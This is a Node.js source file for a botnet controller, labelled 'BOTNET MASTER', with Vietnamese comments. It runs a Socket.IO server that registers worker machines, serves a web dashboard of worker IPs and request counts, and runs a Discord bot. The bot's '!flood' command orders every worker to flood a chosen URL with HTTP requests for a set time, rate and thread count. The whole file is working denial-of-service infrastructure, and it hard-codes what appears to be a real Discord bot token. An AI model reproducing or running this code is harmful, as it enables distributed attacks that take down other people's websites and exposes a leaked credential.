process.on('uncaughtException', (err) => {
    console.error('[!] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.error('[!] Unhandled Rejection:', err.message);
});

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');
const fs = require('fs');

// ==================== CONFIG ====================
const PORT = process.env.PORT || 10000;
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GwqGFR.mOSL4JCqw2hIf_cMlVuWZQmANmfOFmDsefuKWQ';
const CHANNEL_ID = '1456595444477198508';

// ==================== KIỂM TRA CONFIG ====================
if (TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('[!] LỖI: Bạn chưa cấu hình TOKEN Discord!');
    process.exit(1);
}

if (CHANNEL_ID === 'YOUR_CHANNEL_ID_HERE') {
    console.error('[!] LỖI: Bạn chưa cấu hình CHANNEL_ID Discord!');
    process.exit(1);
}

// ==================== EXPRESS SERVER ====================
const app = express();
const server = http.createServer(app);

// Cấu hình Socket.IO - SIÊU ỔN ĐỊNH
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true,
        allowedHeaders: ["*"]
    },
    transports: ['websocket', 'polling'],
    allowEIO3: true,
    pingTimeout: 60000,        // 60 giây
    pingInterval: 25000,        // 25 giây
    connectTimeout: 60000,
    maxHttpBufferSize: 1e8,
    cookie: false
});

// ==================== MIDDLEWARE ====================
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ==================== BIẾN TOÀN CỤC ====================
let workers = new Map(); // { socket.id: { socket, ip, status, target, lastSeen } }
let currentAttack = null;
let totalRequests = 0;
let attackStartTime = null;

// ==================== ROUTES ====================

// Route chính
app.get('/', (req, res) => {
    const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🔥 BOTNET MASTER</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
                .stat { font-size: 24px; color: #00ff00; }
                .label { color: #888; }
                .attacking { color: #ff4444; }
                .idle { color: #888; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                th { color: #00ff00; }
                .online { color: #00ff00; }
                .offline { color: #ff4444; }
            </style>
            <meta http-equiv="refresh" content="5">
        </head>
        <body>
            <div class="container">
                <h1>🔥 BOTNET MASTER CONTROLLER</h1>
                
                <div class="card">
                    <h2>System Status</h2>
                    <table>
                        <tr><td class="label">Workers Online:</td><td class="stat">${workers.size}</td></tr>
                        <tr><td class="label">Status:</td><td class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</td></tr>
                        <tr><td class="label">Total Requests:</td><td class="stat">${totalRequests.toLocaleString()}</td></tr>
                        <tr><td class="label">Port:</td><td class="stat">${PORT}</td></tr>
                        <tr><td class="label">Uptime:</td><td class="stat">${Math.floor(process.uptime() / 60)} minutes</td></tr>
                    </table>
                </div>
                
                <div class="card">
                    <h2>Current Attack</h2>
                    ${currentAttack ? `
                    <table>
                        <tr><td class="label">Target:</td><td class="attacking">${currentAttack.target}</td></tr>
                        <tr><td class="label">Time:</td><td>${Math.floor((Date.now() - currentAttack.start) / 1000)}s / ${currentAttack.time}s</td></tr>
                        <tr><td class="label">Rate/Worker:</td><td>${currentAttack.rate}</td></tr>
                        <tr><td class="label">Threads/Worker:</td><td>${currentAttack.threads}</td></tr>
                        <tr><td class="label">Workers Attacking:</td><td>${attacking}</td></tr>
                    </table>
                    ` : '<p>No active attack</p>'}
                </div>
                
                <div class="card">
                    <h2>Workers List (${workers.size})</h2>
                    <table>
                        <tr>
                            <th>IP</th>
                            <th>Status</th>
                            <th>Target</th>
                            <th>Last Seen</th>
                            <th>Connection</th>
                        </tr>
                        ${Array.from(workers.entries()).map(([id, w]) => `
                        <tr>
                            <td>${w.ip}</td>
                            <td class="${w.status === 'attacking' ? 'attacking' : 'idle'}">${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'}</td>
                            <td>${w.target || '-'}</td>
                            <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s ago</td>
                            <td class="${w.socket?.connected ? 'online' : 'offline'}">${w.socket?.connected ? '✅ ONLINE' : '❌ OFFLINE'}</td>
                        </tr>
                        `).join('')}
                        ${workers.size === 0 ? '<tr><td colspan="5" style="text-align:center">No workers connected</td></tr>' : ''}
                    </table>
                </div>
                
                <div class="card">
                    <h2>Discord Commands</h2>
                    <table>
                        <tr><td><code>!workers</code></td><td>- Xem danh sách worker</td></tr>
                        <tr><td><code>!flood &lt;url&gt; &lt;time&gt; &lt;rate&gt; &lt;threads&gt;</code></td><td>- Bắt đầu tấn công</td></tr>
                        <tr><td><code>!stop</code></td><td>- Dừng tấn công</td></tr>
                        <tr><td><code>!status</code></td><td>- Xem trạng thái</td></tr>
                        <tr><td><code>!help</code></td><td>- Xem hướng dẫn</td></tr>
                    </table>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Route API
app.get('/api/status', (req, res) => {
    const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
    
    res.json({
        workers: workers.size,
        attacking: attacking,
        idle: workers.size - attacking,
        totalRequests: totalRequests,
        currentAttack: currentAttack ? {
            target: currentAttack.target,
            time: currentAttack.time,
            elapsed: Math.floor((Date.now() - currentAttack.start) / 1000),
            rate: currentAttack.rate,
            threads: currentAttack.threads
        } : null,
        workersList: Array.from(workers.values()).map(w => ({
            ip: w.ip,
            status: w.status,
            target: w.target,
            lastSeen: w.lastSeen,
            connected: w.socket?.connected || false
        }))
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        workers: workers.size,
        port: PORT,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        connections: Object.keys(io.sockets.sockets || {}).length
    });
});

// ==================== SOCKET.IO - XỬ LÝ WORKER ====================
io.on('connection', (socket) => {
    const clientIp = socket.handshake.address;
    console.log(`[+] Worker connected: ${socket.id} from ${clientIp}`);

    // Đăng ký worker
    socket.on('register', (data) => {
        const workerIp = data.ip || clientIp;
        
        workers.set(socket.id, {
            socket: socket,
            ip: workerIp,
            status: 'idle',
            target: null,
            lastSeen: Date.now()
        });
        
        console.log(`[+] Worker registered: ${workerIp} (Total: ${workers.size})`);

        // Nếu đang có attack, gửi lệnh cho worker mới
        if (currentAttack) {
            socket.emit('attack', currentAttack);
            workers.get(socket.id).status = 'attacking';
            workers.get(socket.id).target = currentAttack.target;
        }

        socket.emit('registered', { status: 'ok', workers: workers.size });
    });

    // Xử lý ping - GIỮ KẾT NỐI
    socket.on('ping', () => {
        socket.emit('pong');
        const worker = workers.get(socket.id);
        if (worker) {
            worker.lastSeen = Date.now();
        }
    });

    // Nhận stats từ worker
    socket.on('stats', (data) => {
        const worker = workers.get(socket.id);
        if (worker) {
            worker.lastSeen = Date.now();
            if (data && data.count) {
                totalRequests += data.count;
            }
        }
    });

    // Xử lý ngắt kết nối
    socket.on('disconnect', (reason) => {
        const worker = workers.get(socket.id);
        if (worker) {
            console.log(`[-] Worker disconnected: ${worker.ip} - Reason: ${reason}`);
            
            // Nếu worker đang attack, cập nhật trạng thái
            if (worker.status === 'attacking' && currentAttack) {
                console.log(`[!] Worker ${worker.ip} lost during attack`);
            }
            
            workers.delete(socket.id);
        }
    });

    // Xử lý lỗi
    socket.on('error', (error) => {
        console.error(`[!] Socket error from ${socket.id}:`, error.message);
    });
});

// ==================== GIỮ KẾT NỐI WORKER ====================

// Gửi ping định kỳ đến tất cả worker
setInterval(() => {
    workers.forEach((worker, id) => {
        if (worker.socket && worker.socket.connected) {
            worker.socket.emit('ping');
        }
    });
}, 15000); // 15 giây

// Kiểm tra worker chết và xóa
setInterval(() => {
    const now = Date.now();
    workers.forEach((worker, id) => {
        // Nếu worker không gửi heartbeat trong 60 giây, coi như chết
        if (now - worker.lastSeen > 60000) {
            console.log(`[-] Worker ${worker.ip} timeout, removing...`);
            if (worker.socket) {
                worker.socket.disconnect(true);
            }
            workers.delete(id);
        }
    });
}, 30000); // 30 giây

// ==================== DISCORD BOT ====================
const discordClient = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

discordClient.once('ready', () => {
    console.log(`[+] Discord Bot ready as ${discordClient.user.tag}`);
    
    const channel = discordClient.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║     🔥 BOTNET MASTER - READY                         ║
╠══════════════════════════════════════════════════════╣
║  📡 Workers: ${workers.size}                                         ║
║  🌐 Port: ${PORT}                                            ║
║  🔗 URL: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}  ║
╠══════════════════════════════════════════════════════╣
║  📚 COMMANDS:                                          ║
║  !flood <url> <time> <rate> <threads>                ║
║  !stop                                                ║
║  !status                                              ║
║  !workers                                             ║
║  !help                                                ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

discordClient.on('messageCreate', async (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;

    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();

    if (cmd === 'help') {
        msg.channel.send(`
**📚 HƯỚNG DẪN SỬ DỤNG**
\`!flood <url> <time> <rate> <threads>\` - Bắt đầu tấn công
  Ví dụ: \`!flood https://example.com 300 500 50\`

\`!stop\` - Dừng tất cả tấn công
\`!status\` - Xem trạng thái hiện tại
\`!workers\` - Xem danh sách worker
\`!help\` - Hiện hướng dẫn này
        `);
    }

    else if (cmd === 'workers') {
        if (workers.size === 0) {
            return msg.channel.send('❌ Không có worker nào đang kết nối!');
        }

        const list = Array.from(workers.values()).map(w => 
            `🔹 ${w.ip} - ${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'} ${w.target ? '🎯 ' + w.target : ''}`
        ).join('\n');

        msg.channel.send(`**📡 WORKERS (${workers.size}):**\n${list}`);
    }

    else if (cmd === 'flood') {
        if (args.length < 5) {
            return msg.channel.send('❌ Thiếu tham số! Dùng: !flood <url> <time> <rate> <threads>');
        }

        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);

        if (!target.startsWith('http')) {
            return msg.channel.send('❌ URL phải bắt đầu bằng http:// hoặc https://');
        }

        if (isNaN(time) || time < 10) {
            return msg.channel.send('❌ Thời gian phải >= 10 giây');
        }

        if (isNaN(rate) || rate < 10) {
            return msg.channel.send('❌ Rate phải >= 10');
        }

        if (isNaN(threads) || threads < 1) {
            return msg.channel.send('❌ Threads phải >= 1');
        }

        if (workers.size === 0) {
            return msg.channel.send('❌ Không có worker nào để tấn công!');
        }

        // Dừng attack cũ nếu có
        if (currentAttack) {
            io.emit('stop');
            currentAttack = null;
        }

        // Bắt đầu attack mới
        currentAttack = { target, time, rate, threads, start: Date.now() };
        totalRequests = 0;
        attackStartTime = Date.now();

        // Gửi lệnh cho tất cả worker
        let sentCount = 0;
        workers.forEach((worker, id) => {
            if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
                worker.socket.emit('attack', currentAttack);
                worker.status = 'attacking';
                worker.target = target;
                sentCount++;
            }
        });

        msg.channel.send(`
🔥 **BOTNET ATTACK STARTED**
🎯 Target: ${target}
⏱️ Time: ${time}s
⚡ Rate: ${rate}/worker
🧵 Threads: ${threads}/worker
📡 Workers: ${sentCount}/${workers.size}
        `);

        // Tự động kết thúc sau thời gian
        setTimeout(() => {
            if (currentAttack) {
                io.emit('stop');
                
                workers.forEach(worker => {
                    if (worker.status === 'attacking') {
                        worker.status = 'idle';
                        worker.target = null;
                    }
                });

                const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
                msg.channel.send(`
✅ **ATTACK FINISHED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${workers.size}
                `);
                
                currentAttack = null;
            }
        }, time * 1000);
    }

    else if (cmd === 'stop') {
        if (currentAttack) {
            io.emit('stop');
            
            workers.forEach(worker => {
                if (worker.status === 'attacking') {
                    worker.status = 'idle';
                    worker.target = null;
                }
            });

            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
            msg.channel.send(`
🛑 **ATTACK STOPPED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
            `);
            
            currentAttack = null;
        } else {
            msg.channel.send('⚠️ Không có attack nào đang chạy');
        }
    }

    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
            const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
            
            msg.channel.send(`
📊 **ATTACK STATUS**
🎯 Target: ${currentAttack.target}
⏱️ Time: ${elapsed}s / ${currentAttack.time}s
📊 Requests: ${totalRequests.toLocaleString()}
⚡ RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${attacking}/${workers.size}
            `);
        } else {
            msg.channel.send(`📡 **SYSTEM STATUS**\nWorkers: ${workers.size}\nStatus: IDLE`);
        }
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Master server running on port ${PORT}`);
    console.log(`[+] Health check: http://localhost:${PORT}/health`);
    console.log(`[+] Waiting for workers...`);
});

// Discord login
discordClient.login(TOKEN).catch(err => {
    console.error('[!] Discord login failed:', err.message);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[!] Received SIGTERM, shutting down...');
    io.emit('shutdown');
    server.close(() => {
        process.exit(0);
    });
});
